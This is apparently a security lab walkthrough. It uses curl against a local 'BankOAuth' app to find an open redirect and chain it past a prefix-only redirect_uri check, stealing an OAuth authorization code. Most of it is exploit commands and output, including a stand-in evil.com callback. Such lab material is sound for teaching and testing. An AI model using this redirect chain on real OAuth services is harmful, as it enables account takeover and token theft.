# 03: Finding the Bug

## Probe the application

Start the lab and read the index:

```
$ curl -s http://127.0.0.1:8097/
{"app":"BankOAuth","endpoints":[
  "GET /oauth/authorize?client_id=&redirect_uri=&state=&response_type=code",
  "POST /oauth/token  {code, client_id, client_secret}",
  "GET /client/callback?code=&state=  (legitimate callback)",
  "GET /client/go?to=...             (VULNERABLE open redirect)",
  "GET /api/profile                  (requires Bearer token)",
  "GET /api/secret                   (requires Bearer token, alice only)",
  "GET /attacker/land?code=          (simulates attacker capture page)"
]}
```

Two endpoints stand out: `/client/go?to=...` and `/oauth/authorize`.

## Test the open redirect

```
$ curl -si 'http://127.0.0.1:8097/client/go?to=http://example.com/'
HTTP/1.1 302 FOUND
Location: http://example.com/
```

The redirect lands wherever `to` says. No validation.

## Test redirect_uri validation

The registered prefix is `http://127.0.0.1:8097/client`. Try a redirect_uri that does NOT start with the prefix:

```
$ curl -s 'http://127.0.0.1:8097/oauth/authorize?client_id=trusted-app&response_type=code&redirect_uri=http://evil.com/steal'
{"error":"invalid_redirect_uri","detail":"must start with http://127.0.0.1:8097/client"}
```

The server enforces a prefix check. Now try one that DOES start with the prefix but chains to the open redirect:

```
$ CHAIN='http://127.0.0.1:8097/client/go?to=http://127.0.0.1:8097/attacker/land'
$ curl -sL "http://127.0.0.1:8097/oauth/authorize?client_id=trusted-app&response_type=code&redirect_uri=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=''))" "$CHAIN")"
{"message":"Attacker captured the authorization code!","stolen_code":"abc123..."}
```

The server accepted the redirect_uri because it starts with `/client`. The redirect chain fired, and the authorization code landed on the simulated attacker page.
